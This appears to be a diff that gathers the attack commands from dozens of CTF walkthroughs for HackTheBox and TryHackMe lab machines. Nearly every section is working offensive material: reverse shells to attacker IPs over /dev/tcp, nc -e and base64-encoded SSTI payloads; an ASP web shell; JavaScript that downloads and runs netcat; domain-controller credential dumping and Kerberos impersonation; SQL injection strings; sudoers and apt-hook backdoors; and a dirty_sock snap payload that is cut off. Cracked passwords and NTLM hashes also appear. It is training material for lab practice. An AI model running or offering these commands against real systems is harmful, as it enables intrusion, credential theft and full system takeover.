@@ -1,352 +1,2081 @@
 Challenge URL: https://www.hackingarticles.in/blackfield-hackthebox-walkthrough/
+nmap -sV 10.129.45.226
+smbclient -L 10.129.45.226
+impacket-GetNPUsers -dc-ip 10.129.45.226 blackfield.local/ -usersfile username.txt > result.txt
+john --wordlist=/usr/share/wordlists/rockyou.txt hash
+rpcclient -U support%#00^BlackKnight 10.129.45.226
+bloodhound-python -u support -p '#00^BlackKnight' -d blackfield.local -ns 10.129.45.226 -c all
+setuserinfo2 audit2020 23 'Password@1'
+smbclient -U 'audit2020'  //10.129.45.226/forensic
+get lsass.zip
+privilege:debug
+sekurlsa::minidump lsass.DMP
+evil-winrm -i 10.129.45.226 -u svc_backup -H '9658d1d1dcd9250115e2205d9f48400d'
+leafpad raj.dsh
+set context persistent nowriters
+add volume c: alias raj
+create
+expose %raj% z:
+unix2dos raj.dsh
+mkdir temp
+cd temp
+upload raj.dsh
+cd C:\Temp
+upload raj.dsh
+diskshadow /s raj.dsh
+robocopy /b z:\windows\ntds . ntds.dit
+reg save hklm\system C:\Temp\system
+cd C:\Temp
+download ntds.dit
+download system
+impacket-secretsdump -ntds ntds.dit -system system local
+evil-winrm -i 10.129.45.226 -u administrator -H '184fb5e5178480be64824d4cd53b99ee'
 
 
 
 Challenge URL: https://www.hackingarticles.in/antique-hackthebox-walkthrough/
+nmap -p- -sV 10.129.33.36
+searchsploit HP JetDirect
+searchsploit -m 22319
+cat 22319.txt
+nmap -sU -sV -p 161 10.129.33.36
+snmpget -v 1 -c public 10.129.33.36 .1.3.6.1.4.1.11.2.3.9.1.1.13.0
+P@ssw0rd@123!!123
+use multi/script/web_delivery
+set lhost 10.10.14.93
+set srvhost 10.10.14.93
+exploit
+python3 -c "import sys;import ssl;u=__import__('urllib'+{2:'',3:'.request'}[sys.version_info[0]],fromlist=('urlopen',));r=u.urlopen('http://10.10.14.93:8080/CzrKiV54o7', context=ssl._create_unverified_context());exec(r.read());"
+portfwd add -l 8082 -p 631 -r 127.0.0.1
+use post/multi/escalate/cups_root_file_read
+set session 1
+set file /root/root.txt
+gunzip chisel_1.7.7_linux_amd64.gz
+python3 -m http.server 80
+chmod 777 chisel_1.7.7_linux_amd64.gz
+./ chisel_1.7.7_linux_amd64.gz server -p 5000 --reverse
+telnet 10.129.33.36
+Nc -nlvp 1234
+exec bash -c 'bash -i >& /dev/tcp/10.10.14.93/1234 0>&1'
+wget 10.10.14.93/chisel_1.7.7_linux_amd64
+./chisel_1.7.7_linux_amd64 client 10.10.14.93:5000 R:5432:localhost:631
 
 
 
 Challenge URL: https://www.hackingarticles.in/nunchucks-hackthebox-walkthrough/
+nmap -sV -sC 10.129.30.114
+wfuzz -c -w /usr/share/wordlists/dirb/common.txt -t30 --hw 2271 -H "Host:FUZZ.nunchucks.htb" https://nunchucks.htb/
+{{7*7}}
+"{{range.constructor(\"return global.process.mainModule.require('child_process').execSync('cat /etc/passwd')\")()}}"
+echo 'bash -c "bash -i >& /dev/tcp/10.10.14.30/443 0>&1"' | base64
+"{{range.constructor(\"return global.process.mainModule.require('child_process').execSync('echo YmFzaCAtYyAiYmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC4zMC80NDMgMD4mMSIK | base64 -d | bash')\")()}}"
+nc -lvp 443
+cd /home/david
+cat user.txt
+python3 -m http.server 80
+cd /tmp
+wget 10.10.14.30/linpeas.sh
+chmod  777 linpeas.sh
+./linpeas.sh
+python3 -m http.server 80
+cd /tmp
+wget 10.10.14.30/test.sh 
+chmod  777 test.sh
+./test.sh
 
 
 
 Challenge URL: https://www.hackingarticles.in/late-hackthebox-walkthrough/
+nmap -sV 10.129.227.134
+{{7*7}}
+{{ get_flashed_messages.__globals__.__builtins__.open("/etc/passwd").read() }}
+{{ get_flashed_messages.__globals__.__builtins__.open("/home/svc_acc/.ssh/id_rsa").read() }}
+chmod 600 key
+ssh -i key svc_acc@10.129.227.134
+cat user.txt
+python3 -m http.server 80
+wget 10.10.14.31/linpeas.sh
+chmod  777 linpeas.sh
+./linpeas.sh
 
 
 
 Challenge URL: https://www.hackingarticles.in/backdoor-hackthebox-walkthrough/
+nmap -p- -sV 10.129.96.68
+/wp-content/plugins/
+searchsploit ebook wordpress
+searchsploit -m 39575
+cat 39575.txt
+Curl 10.129.96.68/wp-content/plugins/ebook-download/filedownload.php?ebookdownloadurl=../../../wp-config.php
+/proc/sched_debug
+searchsploit -m 50539
+msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.14.65 LPORT=4444 PrependFork=true -o rev.bin
+python3 50539.py 10.129.96.68:1337 rev.bin
+find / -perm -u=s -type f  2>/dev/null
+export TERM=xterm
+screen -r root/root
 
 
 
 Challenge URL: https://www.hackingarticles.in/goodgames-hackthebox-walkthrough/
+nmap -sV -sC 10.129.33.160
+sqlmap -r sqlfile –dbs --batch
+sqlmap -r sqlfile -D main –dbs --batch
+{{ namespace.__init__.__globals__.os.popen('id').read() }}
+{{ namespace.__init__.__globals__.os.popen('bash -c "bash -i >& /dev/tcp/10.10.14.93/1234 0>&1"').read() }}
+nc -lvp 1234
+wget https://github.com/andrew-d/static-binaries/blob/master/binaries/linux/x86_64/nmap
+python3 -m http.server 80
+wget 10.10.14.93/nmap
+./nmap 172.19.0.1 -v
+ssh augustus@172.19.0.1
+python -c 'import pty; pty.spawn("/bin/bash")'
+cp /bin/bash .
+chown root:root bash
+chmod 4777 bash
+ssh augustus@172.19.0.1
+./bash -p
+cat /root/root/root.txt
 
 
 
 Challenge URL: https://www.hackingarticles.in/paper-hackthebox-walkthrough/
+nmap  -sV 10.129.74.162
+htttp://10.129.74.162
+curl -I 10.129.74.162
+searchsploit WordPress 5.2.3
+searchsploit -m 47690
+cat 47690.md
+http://chat.office.papaer/register/8qozr226AhkCHZdyY
+file ../hubot/.env
+Username: dwight
+Password: Queenofblad3s!23
+ssh dwight@10.129.74.162
+python3 -m http.server 80
+wget 10.10.14.12/linpeas.sh
+chmod 777 linpeas.sh 
+./linpeas.sh
+wget https://raw.githubusercontent.com/Almorabea/Polkit-exploit/main/CVE-2021-3560.py
+wget 10.10.14.12/ CVE-2021-3560.py
+python3 CVE-2021-3560.py
 
 
 
 Challenge URL: https://www.hackingarticles.in/pandora-hackthebox-walkthrough/
+nmap -sC -sV 10.129.26.243
+htttp://10.129.26.243
+nmap -sU 10.129.26.243
+snmp-check 10.129.26.243
+snmpwalk -c public -v1 10.129.26.243
+ssh daniel@10.129.26.243
+cd /home
+cd matt
+ls
+cat user.txt
+cd /tmp
+wget 10.10.14.3/linpeas.sh
+chmod 777 linpeas.sh
+./linpeas.sh
+ssh -L 8084:localhost:80 -N -f -l daniel 10.129.26.243
+http://localhost:8084/pandora_console/
+http://localhost:8084/pandora_console/include/chart_generator.php?session_id=a' UNION SELECT 'a',1,'id_usuario|s:5:"admin";' as data FROM tsessions_php WHERE '1'='1
+cd /usr/share/webshells/php
+cp php-reverse-shell.php /root/shell.php
+http://localhost:8084/pandora_console/images/shell.php
+nc -lvp 1234
+ssh-keygen -f pandora
+ls -la
+python3 -m http.server 80
+mkdir .ssh
+cd .ssh
+wget 10.10.14.3/pandora.pub
+mv pandora.pub authorized_keys
+cd ..
+chmod +R 777 .ssh
+cd /tmp
+echo "/bin/bash" > tar
+chmod 777 tar
+export PATH=.:$PATH
+/usr/bin/pandora_backup
+cd /root
+ls
+cat root.txt
 
 
 
 Challenge URL: https://www.hackingarticles.in/driver-hackthebox-walkthrough/
+cat shell.scf
+[Shell]
+Command=2
+IconFile=\\10.10.14.93\tools\ignite.ico
+[Taskbar]
+Command=ToggleDesktop
+smbserver.py tools $(pwd) -smb2support
+gem install evil-winrm
+evil-winrm -i 10.129.32.68 -u tony -p liltony
+cd ..\Desktop
+cat user.txt
+wget https://github.com/carlospolop/peass-ng/releases/download/20221006/winpeasx64.exe
+upload /root/winpeasx64.exe
+.\winpeasx64.exe
+wget https://raw.githubusercontent.com/johnhammond/cve-2021-34527/master/cve-2021-34527.ps1
+Set-ExecutionPolicy RemoteSigned -Scope CurrentUser
+Import-Module .\CVE-2021-34527.ps1
+Invoke-Nightmare -NewUser "aarti" -NewPassword "Ignite@123987"
+net user
+net user aarti
+evil-winrm -i 10.129.32.68 -u aarti -p ignite@123987
+cd c:\users\administrator\desktop
+cat root.txt
 
 
 
 Challenge URL: https://www.hackingarticles.in/timelapse-hackthebox-walkthrough/
+nmap -p- -sV 10.129.227.105
+smbclient -L 10.129.227.105
+fcrackzip -D -u winrm_backup.zip -p /usr/share/wordlists/rockyou.txt
+unzip winrm_backup.zip
+pfx2john legacyy_dev_auth.pfx >pfxhash
+openssl pkcs12 -in legacyy_dev_auth.pfx -nocerts -out priv-key.pem -nodes
+openssl pkcs12 -in legacyy_dev_auth.pfx -nokeys -out certificate.pem
+evil-winrm -i 10.129.227.105 -c certificate.pem -k priv-key.pem -S -r timelapse
+evil-winrm -i 10.129.227.105 -u svc_deploy -p 'E3R$Q62^12p7PLlC%KWaxuaV' -S
+Get-ADComputer DC01 -property 'ms-mcs-admpwd'
+evil-winrm -i 10.129.227.105 -u administrator -p 'gU}0649&H)l8VrkJB1n95q0A' -S
 
 
 
 Challenge URL: https://www.hackingarticles.in/return-hackthebox-walkthrough/
+nmap -sV -sC 10.129.31.219
+nc -lvp 389
+evil-winrm -i 10.129.31.219 -u svc-printer -p "1edFg43012!!"
+upload /usr/share/windows-binaries/nc.exe
+services
+sc.exe config WinDefend binPath="C:\Users\svc-printer\Desktop\nc.exe -e cmd.exe 10.10.14.93 1234"
+sc.exe config VMTools binPath="C:\Users\svc-printer\Desktop\nc.exe -e cmd.exe 10.10.14.93 1234"
+sc.exe stop VMTools
+sc.exe start VMTools
 
 
 
 Challenge URL: https://www.hackingarticles.in/horizontall-hackthebox-walkthrough/
+nmap -sV -sC -Pn 10.129.149.92
+wfuzz -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -H "Host: FUZZ.horizontall.htb" --sc 200 10.129.149.92
+echo "10.129.149.92   api-prod.horizontall.htb" >> /etc/hosts
+whatweb http://api-prod.horizontall.htb/admin/
+searchsploit -m 50239
+python3 50239.py http://api-prod.horizontall.htb
+rm -f /tmp/f;mknod /tmp/f p;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.16.10 1234 >/tmp/f
+nc -nlvp 1234
+python3 -c 'import pty;pty.spawn("/bin/bash")'
+netstat -plant
+cd ~
+ls -la
+pwd
+cd .ssh
+ssh-keygen
+cp id_rsa.pub authorized_keys
+python3 -m http.server 80
+wget http://10.10.16.10/authorized_keys
+ssh -i id_rsa -L 8000:localhost:8000 strapi@10.129.149.92
+http://localhost:8000
+git clone https://github.com/nth347/CVE-2021-3129_exploit.git
+cd CVE-2021-3129_exploit
+chmod +x exploit.py
+./exploit.py http://localhost:8000 Monolog/RCE1 id
+./exploit.py http://localhost:8000 Monolog/RCE1 "cat /root/root.txt"
 
 
 
 Challenge URL: https://www.hackingarticles.in/anubis-hackthebox-walkthrough/
+nmap -sV -sC -Pn 10.129.95.208
+echo "10.129.95.208   www.windcorp.htb" >> /etc/hosts
+<%
+  Dim oScript
+  Dim oScriptNet
+  Dim oFileSys, oFile
+  Dim szCMD, szTempFile
+
+  On Error Resume Next
+
+  Set oScript = Server.CreateObject("WSCRIPT.SHELL")
+  Set oScriptNet = Server.CreateObject("WSCRIPT.NETWORK")
+  Set oFileSys = Server.CreateObject("Scripting.FileSystemObject")
+
+  szCMD = Request.Form(".CMD")
+  If (szCMD <> "") Then
+    szTempFile = "C:\" & oFileSys.GetTempName( )
+    Call oScript.Run ("cmd.exe /c " & szCMD & " > " & szTempFile, 0, True)
+    Set oFile = oFileSys.OpenTextFile (szTempFile, 1, False, 0)
+  End If
+
+%>
+<FORM action="<%= Request.ServerVariables("URL") %>" method="POST">
+<input type=text name=".CMD" size=45 value="<%= szCMD %>">
+<input type=submit value="Run">
+</FORM>
+<PRE>
+<%
+  If (IsObject(oFile)) Then
+    On Error Resume Next
+    Response.Write Server.HTMLEncode(oFile.ReadAll)
+    oFile.Close
+    Call oFileSys.DeleteFile(szTempFile, True)
+  End If
+%>
+python3 -m http.server 80
+powershell -c iwr http://10.10.16.3/nc64.exe -outf \Users\Administrator\Desktop\nc64.exe
+start \Users\Administrator\Desktop\nc64.exe 10.10.16.3 1337 -e cmd.exe
+nc -nlvp 1337
+openssl req -in req.txt -text
+curl http://10.10.16.3/chisel.exe -outfile chisel.exe
+apt install chisel
+chisel server -p 8001 --reverse
+.\chisel.exe client 10.10.16.3:8001 R:socks
+proxychains curl http://softwareportal.windcorp.htb
+responder -I tun0
+proxychains curl http://softwareportal.windcorp.htb/install.asp?client=10.10.16.3&software=VNC-Viewer-6.20.529-Windows.exe
+smbmap -H 10.129.95.208 -u localadmin -p Secret123
+smbmap -H 10.129.95.208 -u localadmin -p Secret123 -R Shared
+smbclient //10.129.95.208/Shared -U localadmin
+<script src=http://10.10.16.3/jamovi.js></script>
+const ignite = require("child_process");
+ignite.exec("powershell -c iwr http://10.10.16.3/nc64.exe -outf \\windows\\system32\\spool\\drivers\\color\\nc64.exe");
+ignite.exec("start \\windows\\system32\\spool\\drivers\\color\\nc64.exe 10.10.16.3 4444 -e cmd.exe");
+zip -r Whatif.omv *
+smbclient //10.129.95.208/Shared -U localadmin
+del Whatif.omv
+put Whatif.omv
+certutil -catemplates
+Invoke-WebRequest "http://10.10.16.3:8000/Certify.exe" -OutFile "C:\users\diegocruz\Desktop\Certify.exe"
+Invoke-WebRequest "http://10.10.16.3/Rubeus.exe" -OutFile "C:\users\diegocruz\Desktop\Rubeus.exe"
+.\Certify.exe find
+$Properties = @{}
+$Properties.Add('mspki-certificate-name-flag',1)
+$Properties.Add('pkiextendedkeyusage',@('1.3.6.1.4.1.311.20.2.2','1.3.6.1.5.5.7.3.2'))
+$Properties.Add('msPKI-Certificate-Application-Policy',@('1.3.6.1.4.1.311.20.2.2','1.3.6.1.5.5.7.3.2'))
+$Properties.Add('flags','CLEAR')
+$Properties.Add('mspki-enrollment-flag',0)
+$Properties.Add('mspki-private-key-flag',256)
+$Properties.Add('pkidefaultkeyspec',1)
+
+Set-ADCSTemplate -Name Web -Properties $Properties -Force
+Invoke-WebRequest "http://10.10.16.3/PowerView.ps1" -OutFile "C:\users\diegocruz\Desktop\PowerView.ps1"
+Invoke-WebRequest "http://10.10.16.3/ADCS.ps1" -OutFile "C:\users\diegocruz\Desktop\ADCS.ps1"
+Invoke-WebRequest "http://10.10.16.3/reconfiguretemplate.ps1" -OutFile "C:\users\diegocruz\Desktop\reconfiguretemplate.ps1"
+
+cat -raw PowerView.ps1 | iex
+cat -raw ADCS.ps1 | iex
+cat -raw reconfiguretemplate.ps1 | iex
+.\Certify.exe find
+.\certify.exe request /ca:earth.windcorp.htb\windcorp-CA /template:Web /altname:Administrator
+openssl pkcs12 -in cert.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out cert.pfx
+Invoke-WebRequest "http://10.10.16.3/cert.pfx" -OutFile "C:\users\diegocruz\Desktop\cert.pfx"
+.\Rubeus.exe asktgt /user:Administrator /certificate:C:\users\diegocruz\Desktop\cert.pfx /password:123
+python3 /home/kali/impacket/examples/psexec.py -hashes 3CCCXXXXXXXXXXXXXXXXXXXXXXXXXXXX:3CCCXXXXXXXXXXXXXXXXXXXXXXXXXXXX administrator@10.129.95.208 cmd.exe
 
 
 
 Challenge URL: https://www.hackingarticles.in/forge-hackthebox-walkthrough/
-
-
-
-Challenge URL: https://www.hackingarticles.in/corrosion-2-vulnhub-walkthrough/
+nmap -sV -sC -p 1-1000 10.129.164.116
+wfuzz -w /home/kali/seclists/Discovery/DNS/subdomains-top1million-5000.txt -H "Host: FUZZ.forge.htb" --sc 200 10.129.164.116
+echo "10.129.164.116   admin.forge.htb" >> /etc/hosts
+curl http://admin.forge.htb/
+http://ADMIN.FORGE.htb/announcements
+curl http://forge.htb/uploads/ps14SjF8useIEk0VOao1
+http://ADMIN.FORGE.htb/upload?u=ftp://user:heightofsecurity123!@127.0.1.1/
+http://ADMIN.FORGE.htb/upload?u=ftp://user:heightofsecurity123!@127.0.1.1/.ssh/id_rsa
+nano id_rsa
+chmod 600 id_rsa
+ssh -i id_rsa user@forge.htb
+sudo -l
+cat /opt/remote-manage.py
+sudo /usr/bin/python3 /opt/remote-manage.py
+nc localhost 55465
+import os;os.system(“/bin/sh”)
+id
+cat /root/root.txt
 
 
 
 Challenge URL: https://www.hackingarticles.in/intelligence-hackthebox-walkthrough/
+nmap -sV -p- 10.129.163.131
+echo "Jose.Williams" > usernames
+echo "William.Lee" >> usernames
+kerberute userenum -d intelligence.htb --dc 10.129.163.131 usernames
+#!/bin/bash
 
+start=2020-01-01
+end=2022-01-01
+while ! [[ $start > $end ]]; do
+    echo $start
+    start=$(date -d "$start + 1 day" +%F)
+done
 
-
-Challenge URL: https://www.hackingarticles.in/hackable-3-vulnhub-walkthrough/
+./fuzz_date.sh > datelist.txt
+cat datelist.txt | head -n 3
+sed -i s/$/-upload.pdf/ datelist.txt
+cat datelist.txt | head -n 3
+dirb http://10.129.163.131/documents/ datelist.txt -o existing.txt
+sed 's/[^ ]* //' existing.txt > 2.txt
+sed 's/\s.*$//' 2.txt > 3.txt
+cat 3.txt | head -n 4
+rm existing.txt 2.txt && mv 3.txt existing.txt
+wget -i /home/kali/hackthebox/intelligence/existing.txt
+echo "NewIntelligenceCorpUser9876" > password.txt
+exiftool *.pdf | grep Creator > u1.txt
+sed 's/.*://' u1.txt > u2.txt
+sed 's/[^ ]* //' u2.txt > u3.txt
+rm u1.txt u2.txt
+crackmapexec smb 10.129.163.131 -u u3.txt -p NewIntelligenceCorpUser9876
+smbclient -L 10.129.163.131 -U Tiffany.Molina%NewIntelligenceCorpUser9876
+git clone https://github.com/Sagar-Jangam/DNSUpdate.git
+pip3 install -r requirements.txt
+python3.10 DNSUpdate.py -DNS 10.129.163.131 -u 'intelligence.htb\Tiffany.Molina' -p NewIntelligenceCorpUser9876 -a ad -r webharsh -d 10.10.16.10
+hashcat -m 5600 hash /usr/share/wordlists/rockyou.txt
+ldapsearch -H ldap://10.129.163.131 -x -W -D "Ted.Graves@intelligence.htb" -b "dc=intelligence,dc=htb"
+echo "10.129.163.131  intelligence.htb" >> /etc/hosts
+git clone https://github.com/micahvandeusen/gMSADumper.git
+python3 gMSADumper.py -u Ted.Graves -p Mr.Teddy -d intelligence.htb
+apt install ntpdate
+sudo ntpdate 10.129.163.131
+pip3 install impacket --upgrade
+python3 /usr/share/doc/python3-impacket/examples/getST.py intelligence.htb/svc_int$ -spn WWW/dc.intelligence.htb -hashes :6e03616eef48ba6a15be62280aefcdb2 -impersonate administrator
+export KRB5CCNAME=administrator.ccache
+echo "10.129.163.131 dc.intelligence.htb" >> /etc/hosts
+klist
+python3 /usr/share/doc/python3-impacket/examples/psexec.py -k -no-pass dc.intelligence.htb
+cd ../../Users/Administrator
+type root.txt
 
 
 
 Challenge URL: https://www.hackingarticles.in/writer-hackthebox-walkthrough/
+nmap -A 10.129.170.230
+gobuster dir -w /home/kali/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
+uname=admin' union select 1,2,3,4,5,6 -- &password=admin
+uname=admin' union select 1,database(),3,4,5,6 -- &password=admin
+uname=admin' union select 1,load_file("/etc/passwd"),3,4,5,6 -- &password=admin
+uname=admin' union select 1,load_file("/etc/apache2/sites-enabled/000-default.conf"),3,4,5,6 -- &password=admin
+smbmap -H 10.129.170.230 -u "kyle" -p "ToughPasswordToCrack"
+smbclient //10.129.170.230/writer2_project -U 'kyle%ToughPasswordToCrack'
+cd writer_web
+get views.py
+import os
+os.system('bash -c "bash -i >& /dev/tcp/10.10.14.104/1234 0>&1"')
+python3 manage.py dbshell
+show tables;
+select * from auth_user;
+hashcat -m 10000 hash rockyou.txt
+find / -group filter 2>/dev/null
+echo "bash -c 'bash -i &>/dev/tcp/10.10.14.104/5555 0>&1'" > /etc/postfix/disclaimer && echo -e "HELO writer.htb\nMail From:kyle@writer.htb\nRCPT To: john@writer.htb\nData\nTo: john@writer.htb\nFrom: kyle@writer.htb\nSubject: Testing\nTesting\n." | nc localhost 25
+chmod 600 key
+ssh -i key john@10.129.170.230
+id
+find / -group management 2>/dev/null
+ls -la /etc/apt
+echo 'apt::Update::Pre-Invoke {"echo L2Jpbi9iYXNoIC1jICJjaG1vZCA0Nzc3IC9iaW4vYmFzaCIK | base64 -d | bash"};' > /etc/apt/apt.conf.d/000-shell
+ls -la /bin/bash
+/bin/bash -p
 
 
 
 Challenge URL: https://www.hackingarticles.in/dailybugle-tryhackme-walkthrough/
+nmap -sV -sC 10.10.91.172 -Pn
+joomscan -u http://10.10.91.172
+searchsploit joomla 3.7.0
+searchsploit -m 42033
+sqlmap -u "http://10.17.32.212/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=updatexml" --risk=3 --level=5 --random-agent --dump-all -p list[fullordering]
+wget https://raw.githubusercontent.com/XiphosResearch/exploits/master/Joomblah/joomblah.py
+python2.7 joomblah.py http://10.10.91.172
+cat hash
+john --format=bcrypt --wordlist=/usr/share/wordlists/rockyou.txt hash
+nc -nlvp 1234
+cd /var/www/html
+cat configuration.php
+su jjameson
+python -c 'import pty;pty.spawn("/bin/bash")'
+sudo -l
+apt install rpm
+gem install fpm
+echo 'echo "jjameson ALL=(root) NOPASSWD:ALL" >> /etc/sudoers' > my.sh
+fpm -n root -s dir -t rpm -a all --before-install my.sh .
+python3 -m http.server 80
+cd /tmp
+wget http://10.17.32.212/root-1.0-1.noarch.rpm
+sudo yum localinstall -y root-1.0-1.noarch.rpm
+sudo bash
+cd /root
+cat root.txt
 
 
 
 Challenge URL: https://www.hackingarticles.in/previse-hackthebox-walkthrough/
+nmap -A 10.129.95.185
+gobuster dir -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt --url http://10.129.95.185/ -x php
+python3 -c “import pty;pty.spawn(‘/bin/bash’)”
+hashcat -m 500 hash Desktop/rockyou.txt
+ssh m4lwhere@10.129.95.185
+cat user.txt
+sudo -l
+cat /opt/scripts/access_backup.sh
+nano gzip
+#!/bin/bash
+bash -I >& /dev/tcp/10.10.14.104/1234 0>&1
+chmod +x gzip
+export PATH=/home/m4lwhere:$PATH
+sudo /opt/scripts/access_backup.sh
 
 
 
 Challenge URL: https://www.hackingarticles.in/hackthebox-toolbox-walkthrough/
+nmap -A 10.129.224.18
+sqlmap -r req.txt --dbs --force-ssl --batch
+sqlmap -r req.txt --dbs --force-ssl -D public --dump-all --batch
+sqlmap -r req.txt --force-ssl --batch --os-shell
+sqlmap -r req.txt --force-ssl --batch --os-shell --flush-session --time-sec=20
+bash -c 'bash -i &> /dev/tcp/10.10.14.100/4444 0>&1'
+ifconfig
+python3 -c 'import pty; pty.spawn("/bin/bash")'
+ssh docker@172.17.0.1
+tcuser
+sudo -i
+nano key
+chmod 600 key
+ssh -i key administrator@10.129.224.18
 
 
 
 Challenge URL: https://www.hackingarticles.in/pit-hackthebox-walkthrough/
+nmap -sV -sC 10.129.95.189
+nmap –sU 10.129.95.189
+nmap -sU -p161 -sV 10.129.95.189
+snmpwalk -v2c -c public 10.129.95.189 .
+http://dms-pit.htb/seeddmsSix/seeddms
+searchsploit seeddms
+searchsploit –m 47022
+cat 47022.txt
+curl http://dms-pit.htb/seeddms51x/data/1048576/35/1.php?cmd=pwd
+curl http://dms-pit.htb/seeddms51x/data/1048576/35/1.php?cmd=ls+/var/www/html/seeddms51x
+curl http://dms-pit.htb/seeddms51x/data/1048576/35/1.php?cmd=ls++/var/www/html/seeddms51x/conf
+curl http://dms-pit.htb/seeddms51x/data/1048576/35/1.php?cmd=cat+/var/www/html/seeddms51x/conf/setting.xml
+ls
+cat user.txt
+snmpwalk –v 1 -c public 10.129.95.189 1.3.6.1.4.1.8072.1.3.2
+ssh –i id_rsa root@192.168.25.189
+cat root.txt
 
 
 
 Challenge URL: https://www.hackingarticles.in/bounty-hunter-hackthebox-walkthrough/
-
-
-
-Challenge URL: https://www.hackingarticles.in/empire-lupinone-vulnhub-walkthrough/
-
-
-
-Challenge URL: https://www.hackingarticles.in/digital-world-local-vengeance-vulnhub-walkthrough/
-
-
-
-Challenge URL: https://www.hackingarticles.in/digital-world-local-fall-vulnhub-walkthrough/
-
-
-
-Challenge URL: https://www.hackingarticles.in/thales1-vulnhub-walkthrough/
-
-
-
-Challenge URL: https://www.hackingarticles.in/darkhole-2-vulnhub-walkthrough/
+nmap -sC -sV 10.129.95.166
+dirb http://10.129.95.166 -X .php
+dbserver = "localhost"
+dbname = "bounty"
+dbusername = "admin"
+dbpassword = "m19RoAU0hP41A1sTsq6K"
+ssh development@10.129.95.166
+cat user.txt
+sudo -l
+cat file.md
+sudo /usr/bin/python3.8 /opt/skytrain_inc/ticketValidator.py
+/home/develpment/file.md
 
 
 
 Challenge URL: https://www.hackingarticles.in/seal-hackthebox-walkthrough/
-
-
-
-Challenge URL: https://www.hackingarticles.in/chronos-vulnhub-walkthrough/
+nmap -p- -A 10.129.186.142
+dirb https://seal.htb
+tar -xvf backup.gz
+name: "ignite"
+hosts: localhost
+connection: local
+tasks:
+-name: "ignite"
+shell: "chmod +s /bin/bash"
+register: "output"
+sudo /usr/bin/ansible-playbook ./test.yml
 
 
 
 Challenge URL: https://www.hackingarticles.in/explore-hackthebox-walkthrough/
+nmap -p- -sV 10.129.198.246
+git clone https://github.com/fs0c131y/ESFileExplorerOpenPortVuln
+cd ESFileExplorerOpenPortVuln
+ls
+python poc.py
+python poc.py list
+python poc.py --cmd listPics --ip 10.129.198.246
+python poc.py -g /storage/emulated/0/DCIM/creds.jpg --ip 10.129.198.246
+Username: Kristi
+Password: Kr1sT!5h@Rp3xPl0r3!
+ssh kristi@10.129.198.246 -p 2222
+ssh kristi@10.129.198.246 -p 2222 -L 5555:localhost:5555
+apt install adb
+adb connect 127.0.0.1:5555
+adb -s 127.0.0.1 shell
+whoami
+su
+ls
+cd data
+cat root.txt
 
 
 
 Challenge URL: https://www.hackingarticles.in/thenotebook-hackthebox-walkthrough/
+nmap -A  10.129.211.197
+openssl genrsa -out privKey.key 2048
+python -m SimpleHTTPServer 80
+python3 -c 'import pty;pty.spawn("/bin/bash")'
+cp home.tar.gz /tmp/
+tar cvzf home.tar.gz
+cat /home/noah/.ssh/id_rsa
+nano sshkey
+chmod 600 sshkey
+ssh -i sshkey noah@10.129.211.197
+sudo -l
+docker version
+git clone https://github.com/Frichetten/CVE-2019-5736-PoC
+cd CVE-2019-5736
+nano main.go
+bash -i >& /dev/tcp/10.10.14.100/9999 0>&1
+go build main.go
+python -m SimpleHTTPServer 80
+sudo /usr/bin/docker exec -it webapp-dev01 /bin/bash
+cd /tmp
+wget 10.10.14.100/main
+chmod 777 main
+./main
+sudo /usr/bin/docker exec -it webapp-dev01 sh
+nc -lvp 9999
+cd /root
+cat root.txt
 
 
 
 Challenge URL: https://www.hackingarticles.in/armageddon-hackthebox-walkthrough/
+nmap -A  10.129.48.89
+use exploit/unix/webapp/drupal_drupalgeddon2
+set rhosts 10.129.48.89
+set lhost 10.10.14.100
+exploit
+cd sites
+ls
+cd default
+ls
+cat settings.php
+shell
+/bin/bash -i
+netstat -antp
+mysql -u 'drupaluser' -p'CQHEy@9M*m23gBVj' -D drupal -e 'show tables;'
+mysql -u 'drupaluser' -p'CQHEy@9M*m23gBVj' -D drupal -e 'describe users;'
+mysql -u 'drupaluser' -p'CQHEy@9M*m23gBVj' -D drupal -e 'select name,pass from users;'
+nano hash (to copy the hash in the file)
+john –wordlist=/usr/share/wordlists/rockyou.txt hash
+ssh brucetherealadmin@10.129.48.89
+cat user.txt
+sudo -l
+python -c 'print "aHNxcwcAAAAQIVZcAAACAAAAAAAEABEA0AIBAAQAAADgAAAAAAAAAI4DAAAAAAAAhgMAAAAAAAD//////////xICAAAAAAAAsAIAAAAAAAA+AwAAAAAAAHgDAAAAAAAAIyEvYmluL2Jhc2gKCnVzZXJhZGQgZGlydHlfc29jayAtbSAtcCAnJDYkc1daY1cxdDI1cGZVZEJ1WCRqV2pFWlFGMnpGU2Z5R3k5TGJ2RzN2Rnp6SFJqWGZCWUswU09HZk1EMXNMeWFTOTdBd25KVXM3Z0RDWS5mZzE5TnMzSndSZERoT2NFbURwQlZsRjltLicgLXMgL2Jpbi9iYXNoCnVzZXJtb2QgLWFHIHN1ZG8gZGlydHlfc29jawplY2hvICJkaXJ0eV9zb2NrICAgIEFMTD0oQUxMOkFMTCkgQUxMIiA+PiAvZXRjL3N1ZG9lcnMKbmFtZTogZGlydHktc29jawp2ZXJzaW9uOiAnMC4xJwpzdW1tYXJ5OiBFbXB0eSBzbmFwLCB1c2VkIGZvciBleHBsb2l0CmRlc2NyaXB0aW9uOiAnU2VlIGh0dHBzOi8vZ2l0aHViLmNvbS9pbml0c3RyaW5nL2RpcnR5X3NvY2sKCiAgJwphcmNoaXRlY3R1cmVzOgotIGFtZDY0CmNvbmZpbmVtZW50OiBkZXZtb2RlCmdyYWRlOiBkZXZlbAqcAP03elhaAAABaSLeNgPAZIACIQECAAAAADopyIngAP8AXF0ABIAerFoU8J/e5+qumvhFkbY5Pr4ba1mk4+lgZFHaUvoa1O5k6KmvF3FqfKH62aluxOVeNQ7Z00lddaUjrkpxz0ET/XVLOZmGVXmojv/IHq2fZcc/VQCcVtsco6gAw76gWAABeIACAAAAaCPLPz4wDYsCAAAAAAFZWowA/Td6WFoAAAFpIt42A8BTnQEhAQIAAAAAvhLn0OAAnABLXQAAan87Em73BrVRGmIBM8q2XR9JLRjNEyz6lNkCjEjKrZZFBdDja9cJJGw1F0vtkyjZecTuAfMJX82806GjaLtEv4x1DNYWJ5N5R